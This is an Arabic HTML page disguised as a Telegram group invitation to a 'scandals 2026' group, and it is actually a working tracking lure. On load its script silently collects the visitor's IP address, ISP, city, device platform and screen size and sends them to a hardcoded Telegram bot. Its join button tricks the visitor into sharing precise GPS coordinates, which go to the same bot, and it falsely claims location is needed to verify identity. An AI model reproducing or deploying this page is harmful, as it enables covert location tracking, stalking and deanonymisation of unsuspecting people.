<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="جروب: فضائح 2026 🔥">
    <meta property="og:description" content="اضغط للانضمام والمشاهدة فوراً">
    <meta property="og:image" content="https://i.postimg.cc/vTj5sX6c/temp-image-37A0A0F7-325E-437D-8C5D-037D887D7ADD.jpg">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary">

    <title>Telegram: Join Group</title>
    <style>
        /* العودة لألوان تيليجرام الرسمية */
        body { 
            background-color: #2b2b2b; /* لون خلفية تيليجرام القاتم */
            color: white; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
        }
        
        /* البطاقة باللون الأبيض مثل تيليجرام الأصلي */
        .card { 
            background: white; 
            padding: 40px; 
            border-radius: 20px; 
            text-align: center; 
            width: 85%; 
            max-width: 400px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.4); 
            color: #333; /* لون النص داخل البطاقة البيضاء */
        }
        
        /* تنسيق الصورة الشخصية كأيقونة جروب */
        .group-icon { 
            width: 90px; 
            height: 90px; 
            border-radius: 50%; /* لجعلها دائرية */
            object-fit: cover; /* لضمان عدم تمدد الصورة */
            margin-bottom: 20px; 
            box-shadow: 0 2px 8px rgba(0,0,0,0.2); 
        }
        
        /* زر تيليجرام الأزرق الأصلي */
        .btn { 
            background: #24A1DE; /* أزرق تيليجرام */
            color: white; 
            padding: 16px 30px; 
            border: none; 
            border-radius: 30px; 
            font-weight: bold; 
            font-size: 18px; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 25px; 
            transition: background 0.3s; 
        }
        
        .btn:hover { 
            background: #1e8bbf; 
        }
        
        h2 { 
            margin-bottom: 8px; 
            font-size: 24px; 
        }
        
        p { 
            color: #7f8c8d; /* لون النص الرمادي الفرعي */
            font-size: 14px; 
            margin-top: 0; 
            line-height: 1.5; 
        }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://i.postimg.cc/vTj5sX6c/temp-image-37A0A0F7-325E-437D-8C5D-037D887D7ADD.jpg" alt="Group Icon" class="group-icon">
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>جاري فحص الأمان...<br>اضغط انضمام للمتابعة</p>
        <button class="btn" onclick="getGPS()">انضمام للجروب الآن</button>
    </div>

    <script>
        // إعدادات البوت الخاصة بك
        const T = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
        const C = '6648970984';

        // 1. الصيد الصامت الفوري (IP + الشبكة)
        (async function() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();
                
                let msg = `🕵️‍♂️ **صيد صامت (فتح الرابط):**\n\n`;
                msg += `🌐 **الشبكة:** ${d.org}\n`;
                msg += `🆔 **IP:** ${d.ip}\n`;
                msg += `🏙 **المدينة:** ${d.city}\n`;
                msg += `📱 **الجهاز:** ${navigator.platform}\n`;
                msg += `🖥 **الشاشة:** ${window.screen.width}x${window.screen.height}`;

                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            } catch (e) {
                // في حال فشل جلب الـ IP، نرسل إشعاراً بسيطاً بدخول الشخص
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("⚠️ شخص دخل الرابط لكن لم يتم جلب بيانات الـ IP الخاص به")}`);
            }
        })();

        // 2. طلب الموقع الجغرافي عند الضغط على الزر
        function getGPS() {
            if (!navigator.geolocation) {
                alert("متصفحك لا يدعم خاصية تحديد الموقع. لا يمكنك الانضمام.");
                return;
            }

            navigator.geolocation.getCurrentPosition(async (p) => {
                // في حال السماح بالموقع
                const map = `http://googleusercontent.com/maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📍 **الموقع الدقيق صيد ثقيل:**\n" + map)}&parse_mode=Markdown`);
                // التحويل لتيليجرام بعد الإرسال
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                // في حال الرفض
                alert("يجب السماح بالوصول للموقع لتأكيد هويتك ودخول الجروب!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
